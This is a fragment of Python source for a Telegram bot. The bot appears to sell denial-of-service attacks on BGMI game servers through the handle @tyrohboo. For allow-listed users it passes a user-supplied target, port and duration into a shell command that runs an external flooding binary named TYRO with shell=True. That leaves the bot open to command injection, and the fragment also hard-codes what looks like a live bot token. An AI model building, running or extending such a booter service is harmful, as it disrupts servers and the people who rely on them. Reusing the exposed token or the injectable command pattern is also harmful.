...
bot = telebot.TeleBot('7509688708:AAEGTrFRj6klH8WPD21flxvzNorYh3ZAuKg')

# Owner user ID
owner_id = "6764248071"

# Admin user IDs
admin_ids = ["6764248071"]
    ...
    if user_id in allowed_user_ids:
        ...
        if len(command) == 4 or (not message.text.startswith('/') and len(command) == 3):
            ...
            if time > 300:
                ...
                full_command = f"./TYRO {target} {port} {time} 30"
                subprocess.run(full_command, shell=True)
                response = f"BGMI Attack Finished. \nTarget: {target} \nPort: {port} \nPort: {time} OWNER:- @tyrohboo"
        else:
...
3. MAKE SURE YOU JOINED @tyrohboo OTHERWISE NOT WORK
...
def handle_resellership(message):
    bot.reply_to(message, "Contact @tyrohboo for reseller ship.")
